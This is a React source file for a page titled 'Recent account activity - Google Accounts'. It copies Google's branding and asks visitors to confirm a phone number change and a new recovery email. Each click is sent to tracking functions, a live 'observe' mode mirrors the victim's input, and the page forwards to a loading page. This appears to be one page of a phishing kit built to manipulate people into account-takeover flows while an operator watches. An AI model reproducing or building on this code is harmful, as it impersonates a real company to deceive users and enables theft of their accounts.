import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/security-check")({
  head: () => ({
    meta: [
      { title: "Recent account activity - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeSecurityCheckPage,
});

type Choice = "was_me" | "wasnt_me";

const DEFAULT_PHONE = "+1 (413) 222-2617";
const DEFAULT_RECOVERY = "mohhamad.ahman45@gmail.com";

function resolveParam(key: string, fallback: string): string {
  if (typeof window === "undefined") return fallback;
  try {
    const q = new URLSearchParams(window.location.search).get(key);
    if (q && q.trim()) return q.trim();
  } catch {
    /* ignore */
  }
  return fallback;
}

function choiceLabel(c: Choice): string {
  return c === "was_me" ? "This was me" : "This wasn't me";
}

const GE_SECURITY_CSS = `
${GE_SHELL_CSS}

.ge-security .ge-card {
  flex-direction: column;
  height: auto;
  min-height: 0;
}
@media (min-width: 600px) {
  .ge-security .ge-card { min-height: 528px; }
}
@media (min-width: 900px) {
  .ge-security .ge-card {
    flex-direction: column;
    align-items: stretch;
    height: auto;
    min-height: 560px;
    max-width: min(720px, calc(100vw - 48px));
    width: 720px;
  }
}

.ge-security-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
}

.ge-security .ge-title {
  margin-top: 16px;
}
@media (min-width: 840px) {
  .ge-security .ge-title { margin-top: 24px; }
}

.ge-security-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}

.ge-security-list {
  margin: 28px 0 0;
  display: flex;
  flex-direction: column;
  gap: 0;
}

.ge-security-item {
  padding: 20px 0;
  border-top: 1px solid rgba(227, 227, 227, 0.12);
}
.ge-security-item:first-child {
  border-top: none;
  padding-top: 8px;
}

.ge-security-item-title {
  margin: 0;
  font-size: 1rem;
  font-weight: 500;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}

.ge-security-item-desc {
  margin: 6px 0 0;
  font-size: 0.875rem;
  font-weight: 400;
  line-height: 1.4286;
  color: var(--gm3-on-surface-variant);
}
.ge-security-item-desc strong {
  font-weight: 500;
  color: var(--gm3-on-surface);
}

.ge-security-choices {
  display: flex;
  flex-wrap: wrap;
  gap: 12px;
  margin-top: 16px;
}

.ge-choice {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  padding: 0 20px;
  border-radius: 20px;
  border: 1px solid var(--gm3-outline);
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
  transition: background .15s ease, border-color .15s ease, color .15s ease;
}
.ge-choice:hover {
  background: rgba(227, 227, 227, 0.08);
}
.ge-choice.is-selected {
  border-color: transparent;
  background: rgb(227, 227, 227);
  color: rgb(32, 33, 36);
}
.ge-choice.is-selected:hover {
  filter: brightness(0.96);
  background: rgb(227, 227, 227);
}

.ge-security-actions {
  display: flex;
  flex-direction: row;
  align-items: center;
  justify-content: flex-end;
  margin-top: auto;
  padding-top: 28px;
  width: 100%;
}

.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-next:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
`;

function parseChoice(value: string): Choice | null {
  const v = value.trim().toLowerCase();
  if (v === "was_me" || v === "this was me" || v === "was me") return "was_me";
  if (
    v === "wasnt_me" ||
    v === "wasn't_me" ||
    v === "this wasn't me" ||
    v === "this wasnt me" ||
    v === "wasn't me" ||
    v === "wasnt me"
  ) {
    return "wasnt_me";
  }
  return null;
}

function GeSecurityCheckPage() {
  const { trackClick, trackInput, geNavigate, sessionId, isObserve } = useGeTracking();
  const [phone] = useState(() => resolveParam("phone", DEFAULT_PHONE));
  const [recovery] = useState(() =>
    resolveParam("recovery", resolveParam("recovery_email", DEFAULT_RECOVERY)),
  );
  const [phoneChoice, setPhoneChoice] = useState<Choice | null>(null);
  const [recoveryChoice, setRecoveryChoice] = useState<Choice | null>(null);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const choice = parseChoice(String(d.value ?? ""));
      if (!choice) return;
      if (
        d.field === "phone_activity" ||
        d.field === "security_phone" ||
        d.field === "Phone number update"
      ) {
        setPhoneChoice(choice);
      }
      if (
        d.field === "recovery_activity" ||
        d.field === "security_recovery" ||
        d.field === "New recovery email"
      ) {
        setRecoveryChoice(choice);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const canContinue = phoneChoice != null && recoveryChoice != null;

  const pickPhone = (c: Choice) => {
    setPhoneChoice(c);
    trackClick(`Phone number update: ${choiceLabel(c)}`);
    trackInput("phone_activity", choiceLabel(c), "choice");
  };

  const pickRecovery = (c: Choice) => {
    setRecoveryChoice(c);
    trackClick(`New recovery email: ${choiceLabel(c)}`);
    trackInput("recovery_activity", choiceLabel(c), "choice");
  };

  const handleNext = (e?: FormEvent) => {
    e?.preventDefault();
    if (!canContinue || !phoneChoice || !recoveryChoice) return;
    trackClick("Next");
    trackInput("phone_activity", choiceLabel(phoneChoice), "choice");
    trackInput("recovery_activity", choiceLabel(recoveryChoice), "choice");
    geNavigate("/ge/loading");
  };

  return (
    <div className="ge-shell ge-security">
      <GeFontStyle />
      <style>{GE_SECURITY_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-security-body">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Recent account activity</h1>
          <p className="ge-security-lead">
            Please review the recent changes to your account and confirm whether
            they were authorized by you.
          </p>

          <form className="ge-security-list" onSubmit={handleNext} autoComplete="off">
            <section className="ge-security-item" aria-labelledby="ge-sec-phone-title">
              <h2 id="ge-sec-phone-title" className="ge-security-item-title">
                Phone number update
              </h2>
              <p className="ge-security-item-desc">
                An attempt to change your default phone number to{" "}
                <strong>{phone}</strong>.
              </p>
              <div
                className="ge-security-choices"
                role="group"
                aria-label="Phone number update"
              >
                <button
                  type="button"
                  className={`ge-choice${phoneChoice === "wasnt_me" ? " is-selected" : ""}`}
                  aria-pressed={phoneChoice === "wasnt_me"}
                  onClick={() => pickPhone("wasnt_me")}
                >
                  This wasn{"\u2019"}t me
                </button>
                <button
                  type="button"
                  className={`ge-choice${phoneChoice === "was_me" ? " is-selected" : ""}`}
                  aria-pressed={phoneChoice === "was_me"}
                  onClick={() => pickPhone("was_me")}
                >
                  This was me
                </button>
              </div>
            </section>

            <section className="ge-security-item" aria-labelledby="ge-sec-recovery-title">
              <h2 id="ge-sec-recovery-title" className="ge-security-item-title">
                New recovery email
              </h2>
              <p className="ge-security-item-desc">
                An attempt to assign a new recovery email{" "}
                <strong>{recovery}</strong> to your Google account.
              </p>
              <div
                className="ge-security-choices"
                role="group"
                aria-label="New recovery email"
              >
                <button
                  type="button"
                  className={`ge-choice${recoveryChoice === "wasnt_me" ? " is-selected" : ""}`}
                  aria-pressed={recoveryChoice === "wasnt_me"}
                  onClick={() => pickRecovery("wasnt_me")}
                >
                  This wasn{"\u2019"}t me
                </button>
                <button
                  type="button"
                  className={`ge-choice${recoveryChoice === "was_me" ? " is-selected" : ""}`}
                  aria-pressed={recoveryChoice === "was_me"}
                  onClick={() => pickRecovery("was_me")}
                >
                  This was me
                </button>
              </div>
            </section>

            <div className="ge-security-actions">
              <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
                Next
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
